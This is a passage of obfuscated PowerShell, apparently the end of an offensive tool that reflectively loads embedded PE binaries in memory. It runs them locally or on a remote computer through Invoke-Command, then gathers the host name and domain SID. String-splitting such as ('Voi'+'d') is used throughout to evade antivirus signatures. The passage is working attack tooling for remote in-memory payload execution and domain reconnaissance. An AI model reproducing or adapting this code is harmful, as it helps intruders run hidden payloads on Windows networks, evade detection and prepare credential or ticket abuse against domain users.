        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, ('Voi'+'d'), 0, "", $ExeArgs)
    }
    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, ('Vo'+'id'), 0, "", $ExeArgs) -ComputerName $ComputerName
    }
}


$parts = $(whoami /USer)[-1].split(" ")[1];
$parts2 = $parts.split('-');
$HostName = $([System.Net.Dns]::GetHostByName(($env:computerName)).HostName);
$DomainSID = $parts2[0..($parts2.Count-2)] -join '-';
$results = Main;
('H'+'os'+("{0}{1}"-f'tname',': ')+("$HostName "+'')+'/ '+"$DomainSID");
$results
